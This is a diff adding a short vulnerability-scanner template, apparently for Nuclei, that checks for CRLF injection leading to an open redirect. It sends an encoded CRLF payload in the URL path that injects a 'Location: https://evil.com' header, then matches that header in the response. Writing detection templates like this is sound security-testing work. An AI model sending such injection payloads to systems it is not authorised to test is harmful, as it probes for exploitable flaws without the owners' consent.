@@ -1,0 +1,20 @@
+id: crlf-injection2
+
+info:
+  name: CRLF injection to open-redirect
+  author: abdulrahman
+  severity: medium
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0aLocation:%20https://evil.com"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Location: https://evil.com"
+
+
